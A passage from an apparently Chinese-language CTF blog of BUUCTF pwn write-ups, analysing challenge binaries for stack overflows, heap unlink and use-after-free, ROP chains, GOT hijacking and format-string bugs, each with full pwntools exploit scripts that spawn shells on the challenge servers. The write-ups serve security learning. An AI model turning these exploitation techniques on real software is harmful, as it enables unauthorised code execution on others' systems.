<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29528</span>)<br>shell = <span class="hljs-number">0x400E88</span><br><br>p.recvuntil(<span class="hljs-string">&quot;username:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;password:&quot;</span>)<br>payload = <span class="hljs-string">&quot;2jctf_pa5sw0rd&quot;</span>.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十九mrctf2020-easyrop"><a href="#四十九mrctf2020-easyrop" class="headerlink" title="四十九mrctf2020_easyrop"></a>四十九mrctf2020_easyrop</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210812175441484.png"><span class="image-caption">image-20210812175441484</span></p>
<p>checksec，64位，只开启nx</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812180035772.png"><span class="image-caption">image-20210812180035772</span></p>
<p>首先程序存在后门，但是依照逻辑是不可能运行到后门的，所以需要劫持rip执行后门函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812181120347.png"><span class="image-caption">image-20210812181120347</span></p>
<p>所有的输入点都是从var_310开始输入的，然而最大的输入长度也不过是0x300，不够覆盖到返回地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812181040014.png"><span class="image-caption">image-20210812181040014</span></p>
<p>仔细分析程序，可以发现这边有个数组越界，这里的a1是var_310，所以可以先用别的函数输入数据，然后越界覆盖返回地址为后门函数</p>
<p>这边有个注意点：覆盖成功后退出程序时，程序还是会执行到数组越界的函数，所以这时候的输入只能是输入一个’\x00’，并且不能含有换行符，否则会接在前面输入的后门函数的地址上，导致地址无效了</p>
<p>在本地成功getshell，远程的docker可能出问题了，没有反应</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812184240747.png"><span class="image-caption">image-20210812184240747</span></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26109)</span><br>p = process(<span class="hljs-string">&quot;./mrctf2020_easyrop&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>shell = <span class="hljs-number">0x40072A</span><br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2ff</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;hehehehehehehe\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x19</span> + p64(shell)<br>p.sendlineafter(<span class="hljs-string">&quot;bybybybybybyby\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="五十、xdctf2015-pwn200"><a href="#五十、xdctf2015-pwn200" class="headerlink" title="五十、xdctf2015_pwn200"></a>五十、xdctf2015_pwn200</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210812185855607.png"><span class="image-caption">image-20210812185855607</span></p>
<p>checksec一下，32位，开了nx</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812192549644.png"><span class="image-caption">image-20210812192549644</span></p>
<p>程序很简单，这边有个很明显的栈溢出，并且程序含有泄露函数write，构造基础的rop就行了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812192512692.png"><span class="image-caption">image-20210812192512692</span></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25644</span>)<br><span class="hljs-comment">#p=process(&#x27;./bof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>main=<span class="hljs-number">0x80484d6</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="五十一、jarvisoj-level6-x64"><a href="#五十一、jarvisoj-level6-x64" class="headerlink" title="五十一、jarvisoj_level6_x64"></a>五十一、jarvisoj_level6_x64</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210812200521406.png"><span class="image-caption">image-20210812200521406</span></p>
<p>看附件名字，应该是道堆题，这道堆题没开PIE，RELRO没开全，这种题目一般是想办法修改got表，这样能稳定getshell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914200255661.png"><span class="image-caption">image-20210914200255661</span></p>
<p>首先，创建了一个大堆块，用来保存后面申请堆块的size，指针等信息</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914200621734.png"><span class="image-caption">image-20210914200621734</span></p>
<p>在申请堆块功能里的这个语句代表分配堆块的大小是0x80的整数倍</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914200526193-16316211508721.png"><span class="image-caption">image-20210914200526193</span></p>
<p>在edit功能中，如果你写入与之前申请不匹配的size，那么会调用realloc扩充堆块的size，似乎可以造成overlap</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914200603042-16316211674692.png"><span class="image-caption">image-20210914200603042</span></p>
<p>free功能的话，堆结构里面的指针没有清零，存在UAF。但是前面的flag、size都清零了，所以只能double free</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914202759594.png"><span class="image-caption">image-20210914202759594</span></p>
<p>有个注意点是在申请堆块中的输入堆块内容时，你输入多大的size，那你相应就要填入多大的字符，否则这边的read是不会停止的</p>
<p>思路：就先checksec看到的，去劫持got表，一般是free，然后再去释放一个内容为/bin/sh的堆块。这题堆块内容没有清空，并且申请堆块时输入的数据是可以不输入\x00的，所以不会截断，那就说明蕴含着很多脏数据都是可以泄露的！比如libc，比如堆地址，而如果有了堆地址，unlink，随之而来，然后PIE又没开，直接写got表地址，然后写入system地址即可！</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914204249244.png"><span class="image-caption">image-20210914204249244</span></p>
<p>这边释放堆块要注意，得先申请四个，然后隔着释放，因为都是unsorted chunk，得要防止触发unlink合并</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914211338216.png"><span class="image-caption">image-20210914211338216</span></p>
<p>释放完四个堆块后，有残余脏数据的堆结构，现在就要依据这个脏数据进行构造unlink</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210914212020955.png"><span class="image-caption">image-20210914212020955</span></p>
<p>很明显，申请出来的，只能在第三个堆地址上伪造出堆头，这样才能释放该伪造堆块，触发unlink</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210915103319358.png"><span class="image-caption">image-20210915103319358</span></p>
<p>unlink成功，把堆块指针的值变为了堆结构上的地址，之后直接对着堆结构修改即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210915110109421.png"><span class="image-caption">image-20210915110109421</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./freenote_x64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27343</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Length of new note: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Length of note: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0 </span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#因为会凑齐0x80的大小，所以也是相当于申请出0x80的堆</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;0. aaaaaaaa&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">6464</span> <span class="hljs-comment">#接收四个，是因为打远程时，发现堆地址就是四个字节的</span><br>log.success(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>p.recvuntil(<span class="hljs-string">&quot;2. bbbbbbbb&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#清空堆块，为了后续借用UAF进行unlink</span><br><br><span class="hljs-comment">#unlink</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x18</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0x90</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) <br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">2</span>)<br><br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>payload = p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x8</span>) + p64(free)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))   <span class="hljs-comment">#不知道为什么，这里不这样输入，没办法getshell</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="五十二、inndy-rop"><a href="#五十二、inndy-rop" class="headerlink" title="五十二、inndy_rop"></a>五十二、inndy_rop</h3><p>先checksec一下，32位，只开了nx</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210823202233200.png"><span class="image-caption">image-20210823202233200</span></p>
<p>进入ida，程序很简单，只有一个gets函数，明显溢出</p>
<p>然后程序东西很繁杂，这种就是属于静态编译的程序，程序里面包含着程序所需要的函数信息，但是找了一下，没有找到/bin/sh，以及system，那应该就是要构造gadgets了，去使用系统调用号函数获取shell</p>
<img src="/2021/04/07/2021-04-07-buu03/image-20210823195230792.png" style="zoom:80%;"><span class="image-caption">image-20210823195230792</span>

<p>百度了一下，ROPgadget内置了相关工具，可以直接针对这种题目有现成的exp</p>
<p><code>ROPgadget --binary rop --ropchain</code></p>
<img src="/2021/04/07/2021-04-07-buu03/image-20210823195052520.png" style="zoom:80%;"><span class="image-caption">image-20210823195052520</span>

<p><img src="/2021/04/07/2021-04-07-buu03/image-20210823201506833.png"><span class="image-caption">image-20210823201506833</span></p>
<p>这边其实还有种办法，就是使用mprotect函数修改.bss段的执行权限，然后写入shellcode，再执行来getshell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210823201429425.png"><span class="image-caption">image-20210823201429425</span></p>
<p>程序里面是有mprotect函数的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29804</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br>r.close()<br></code></pre></td></tr></table></figure>



<h3 id="五十三、babyfengshui-33c3-2016"><a href="#五十三、babyfengshui-33c3-2016" class="headerlink" title="五十三、babyfengshui_33c3_2016"></a>五十三、babyfengshui_33c3_2016</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210823202142271.png"><span class="image-caption">image-20210823202142271</span></p>
<p>checksec一下，32位，开了NX、Canary</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210823231658268.png"><span class="image-caption">image-20210823231658268</span></p>
<p>漏洞点在于修改堆块内容里面的检查机制有问题：只要把两个堆块分开，一个在头一个在尾，那就代表着能溢出覆盖两个堆块间的所有堆块。而且这很容易就能办到，只要连续申请几次堆块，把最开始申请的释放了，然后我们申请一个被释放大小的堆块，那这个堆块就出现在了头部，而另一个就是在尾部</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827142300094.png"><span class="image-caption">image-20210827142300094</span></p>
<p>而打印函数，认真看，是printf函数，%s，那么这是会解析一个地址，然后把这个地址上的内容打印出来，所以我们通过溢出把free的got表地址写上去，那么解析完打印出来的就是free的真实地址，从而获得libc基址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827143043150.png"><span class="image-caption">image-20210827143043150</span></p>
<p>同样，这边修改description的函数，也是会把description的地址传入进去修改，那么只需要对着前面已经写入free的got表地址的堆块进行这个操作，就能把system函数写进去，从而劫持got表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 27980)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Dis</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upd</span>(<span class="hljs-params">index, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x8</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>Del(<span class="hljs-number">0</span>)<br>Add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>gdb.attach(p)<br>Dis(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>, free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>Upd(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span>, p32(sys_addr))<br>Del(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="五十四、axb-2019-fmt32"><a href="#五十四、axb-2019-fmt32" class="headerlink" title="五十四、axb_2019_fmt32"></a>五十四、axb_2019_fmt32</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210824223244646.png"><span class="image-caption">image-20210824223244646</span></p>
<p>惯例checksec，32位，开了NX</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210824225801805.png"><span class="image-caption">image-20210824225801805</span></p>
<p>IDA里面很明显的就是给了格式化字符串，题目也暗示了。但是由于程序内很干净，没有什么其他函数，那要getshell，就得先格式化字符串泄露出libc，再借用格式化字符串写到栈上，我想了一下，栈还要再泄露出栈地址，也可以实现（因为有个函数environ就是存了栈地址的），所以这边我转念想到劫持got表就不要这么麻烦，got地址又是直接已知的</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210824225741699.png"><span class="image-caption">image-20210824225741699</span></p>
<p>然后先计算偏移，这边可以看见，我是输入了4个a的，但是很明显是没有对齐的，所以之后写payload的时候，要先补齐一个字符，所以我们的偏移从第八个开始</p>
<p>然后这题是有限时的，所以我们利用%x$n的时候，分两次劫持，写成hn（如果hn也超时，那就hhn），这样输入更快捷。不然会timeout</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210825001757873.png"><span class="image-caption">image-20210825001757873</span></p>
